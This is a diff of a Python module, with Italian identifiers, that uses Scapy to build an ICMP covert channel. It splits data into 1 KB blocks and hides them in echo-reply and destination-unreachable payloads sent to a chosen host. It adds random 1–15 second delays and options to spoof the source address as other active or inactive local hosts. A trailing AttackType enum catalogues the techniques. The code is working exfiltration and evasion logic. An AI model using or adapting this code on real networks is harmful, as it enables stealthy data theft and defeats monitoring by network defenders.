@@ -142,23 +142,46 @@ def get_filter_connection_from_function(function_name:str=None, ip_src=None, che
         #    else: print(f"Caso non contemplato: {ip_src.version}") 
 
 #-----------------------------------------------------------------------
-class SendSingleton:  
+class SendSingleton: 
+    class SenderEnum(Enum): 
+        TRUE_SENDER=1
+        FAKE_SENDER_ACTIVE=2
+        FAKE_SENDER_INACTIVE=3
+        FAKE_SENDER_BOTH=4
 
-    def send_data(useDelay=False, useTrueSender=False, tipologia:Enum=None, data:bytes=None, ip_dst:ipaddress.IPv4Address=None): 
-        if not (IS_TYPE.bytes(data) and IS_TYPE.ipaddress(ip_dst) and IS_TYPE.enum(tipologia) and IS_TYPE.list(host_attivi)): 
+    def send_data(useDelay=False, useTrueSender=False, tipologia:Enum=None, data:bytes=None, ip_dst:ipaddress.IPv4Address=None):  
+        if not (IS_TYPE.enum(tipologia) and IS_TYPE.bytes(data) and IS_TYPE.ipaddress(ip_dst)): 
             raise Exception(f"Argomenti non corretti") 
-        if IS_TYPE.boolean(useTrueSender) and not useTrueSender: 
-            classe_host= NETWORK.HOST_ATTIVI() 
-            host_attivi= classe_host.active_host
-            host_attivi= classe_host.inactive_host
-        else: host_attivi, host_inattivi=None,None
+        if IS_TYPE.enum(useTrueSender): 
+            match useTrueSender.name: 
+                case SendSingleton.SenderEnum.TRUE_SENDER.name: 
+                    ip,err=NETWORK.IP.find_local_IP()
+                    if err:
+                        raise Exception("Impossibile trovare l'IP locale: ", err)
+                    host_attivi=[ip]
+                case SendSingleton.SenderEnum.FAKE_SENDER_ACTIVE.name:
+                    classe_host= NETWORK.HOST_ATTIVI() 
+                    host_attivi= classe_host.active_host
+                case SendSingleton.SenderEnum.FAKE_SENDER_INACTIVE.name:
+                    classe_host= NETWORK.HOST_ATTIVI() 
+                    host_attivi= classe_host.inactive_host
+                case SendSingleton.SenderEnum.FAKE_SENDER_BOTH.name:
+                    classe_host= NETWORK.HOST_ATTIVI()
+                    host_attivi= classe_host.active_host
+                    host_attivi.extend(classe_host.inactive_host) 
+                case _: raise Exception("Tipo di sender non valido: ", useTrueSender)
+        else: 
+            ip,err=NETWORK.IP.find_local_IP()
+            if err:
+                raise Exception("Impossibile trovare l'IP locale: ", err)
+            host_attivi=[ip]
         if not IS_TYPE.boolean(useDelay):
             useDelay=False
         if ip_dst.version==4: 
-            sender=SendSingleton.SEND_IPV4()
+            sender=SendSingleton.SEND_IPV4(tipologia, ip_dst, host_attivi)
         elif ip_dst.version==6: 
-            sender=SendSingleton.SEND_IPV6()
-        else: raise Exception("Versione IP non valida: ",ip_dst.version)
+            sender=SendSingleton.SEND_IPV6(tipologia, ip_dst, host_attivi)
+        else: raise Exception("Versione IP non valida: ",ip_dst.version)   
         
         block_size=1024 #bytes (1KB) 
         for i in range(0, len(data), block_size): 
@@ -168,48 +191,7 @@ class SendSingleton:
                     print("Waiting...")
                     time.sleep(random.uniform(1.0,15.0)) 
             except Exception as e: 
-                print("send data IPV4: ",e) 
-    
-    def send_host_attivi(lista_host:list[ipaddress.IPv4Address]=None, target_mac=None, interface=None, ip_dst:ipaddress.IPv4Address=None):
-        #ip_dst=ipaddress.ip_address("192.168.1.13")
-        #interface=NETWORK.INTERFACE_FROM_IP(ip_dst).interface 
-        #target_mac = NETWORK.GET_MAC_ADDRESS(ip_dst).mac_address.strip().replace("-",":").lower()
-        #print("INTERFACE: ",interface)
-        #print("TARGET MAC: ",target_mac) 
-
-        #classe_host= NETWORK.HOST_ATTIVI() 
-        #host_attivi= classe_host.active_host
-        #host_inattivi= classe_host.inactive_host
-        #lista_host=[x for x in host_attivi]
-        #stringa_host=['{:#b}'.format(ipaddress.ip_address(x)) for x in host_attivi] 
-        if not(IS_TYPE.list(lista_host) and len(lista_host)>0 and IS_TYPE.ipaddress(ip_dst) ): 
-            raise Exception("Argomenti non corretti")
-        msg=MSG.START_SOURCES.value
-        for index in range(len(lista_host)): 
-            if not IS_TYPE.ipaddress(lista_host[index]):
-                print("Host non valido: ", lista_host[index]) 
-                continue
-            if len(msg+lista_host[index])>=64: 
-                print("MESSAGGIO: ",len(msg),"\t",msg)
-                #print("IP: ",len(lista_host[index]),"\t",lista_host[index]) 
-                pkt = ( 
-                    Ether(dst=target_mac)
-                    / IP(dst=ip_dst.compressed) 
-                    / ICMP(type=0, id=23, seq=0)  
-                    /Raw(load=(msg).encode()) 
-                ) 
-                sendp(pkt, verbose=1, iface=interface) 
-                msg=MSG.START_SOURCES.value+lista_host[index]
-            else: msg=msg+";"+lista_host[index] 
-        print("MESSAGGIO: ",len(msg),"\t",msg)
-        pkt = ( 
-            Ether(dst=target_mac)
-            / IP(dst=ip_dst.compressed) 
-            / ICMP(type=0, id=23, seq=0)  
-            /Raw(load=(msg+MSG.END_SOURCES.value).encode()) 
-        ) 
-        sendp(pkt, verbose=1, iface=interface) 
-        exit()
+                print("send data IPV4: ",e)  
 
     class SEND_IPV4(): 
         tipologia=None 
@@ -234,7 +216,38 @@ class SendSingleton:
             if host_attivi: 
                 self.host_attivi=host_attivi
                 print("Host Attivi: ",self.host_attivi) 
+            self.send_host_attivi(self.host_attivi, self.target_mac, self.interface, self.ip_dst)
         
+        def send_host_attivi(self, lista_host:list[ipaddress.IPv4Address]=None, target_mac=None, interface=None, ip_dst:ipaddress.IPv4Address=None):
+            if not(IS_TYPE.list(lista_host) and len(lista_host)>0 and IS_TYPE.ipaddress(ip_dst) ): 
+                raise Exception("Argomenti non corretti")
+            msg=MSG.START_SOURCES.value
+            for index in range(len(lista_host)): 
+                if not IS_TYPE.ipaddress(lista_host[index]):
+                    print("Host non valido: ", lista_host[index]) 
+                    continue
+                indirizzo_IP=lista_host[index].compressed
+                if len(msg+indirizzo_IP)>=64: 
+                    print("MESSAGGIO: ",len(msg),"\t",msg)
+                    #print("IP: ",len(lista_host[index]),"\t",lista_host[index]) 
+                    pkt = ( 
+                        Ether(dst=target_mac)
+                        / IP(dst=ip_dst.compressed) 
+                        / ICMP(type=0, id=23, seq=0)  
+                        /Raw(load=(msg).encode()) 
+                    ) 
+                    sendp(pkt, verbose=1, iface=interface) 
+                    msg=MSG.START_SOURCES.value+indirizzo_IP
+                else: msg=msg+";"+indirizzo_IP
+            print("MESSAGGIO: ",len(msg),"\t",msg)
+            pkt = ( 
+                Ether(dst=target_mac)
+                / IP(dst=ip_dst.compressed) 
+                / ICMP(type=0, id=23, seq=0)  
+                /Raw(load=(msg+MSG.END_SOURCES.value).encode()) 
+            ) 
+            sendp(pkt, verbose=1, iface=interface) 
+
         def send_data(self, data:bytes=None): 
             if not (IS_TYPE.bytes(data) ): 
                 raise Exception(f"Argomenti non corretti") 
@@ -290,16 +303,14 @@ class SendSingleton:
                     Raw(load=bytes(dummy_ip)[:28]) 
                 pkt.summary()
                 #pkt.show() 
-                raw_bytes = bytes(pkt)
-                print(raw_bytes.hex())
+                raw_bytes = bytes(pkt) 
                 sendp(pkt, verbose=1, iface=self.interface)  if pkt else print("Pacchetto non presente")
             dummy_ip=IP(src=self.ip_dst.compressed, dst="8.8.8.8", proto=1) / ICMP(id=0,seq=1)
             pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed, proto=1)/\
                 ICMP(type=TYPE_DESTINATION_UNREACHABLE, code=3)/\
                 Raw(load=bytes(dummy_ip)[:28])
             pkt.summary()
-            #pkt.show()
-            print(f"interface: {self.interface}")
+            #pkt.show() 
             sendp(pkt, verbose=1, iface=self.interface) 
         
         def ipv4_destination_unreachable_unused(self, data:bytes=None): 
@@ -1468,7 +1479,6 @@ class SendSingleton:
                     ans = sendp(pkt, verbose=1,iface=interface)
                 time.sleep(TEMPO_BYTE)
             end_time=datetime.datetime.now(datetime.timezone.utc) 
-
 
 class ReceiveSingleton: 
     ip_dst=None
@@ -3175,7 +3185,6 @@ class ReceiveSingleton:
                 self.data=cleaned 
                 return True 
             return False
-
 
 class AttackType(Enum): 
     ipv4_destination_unreachable=0
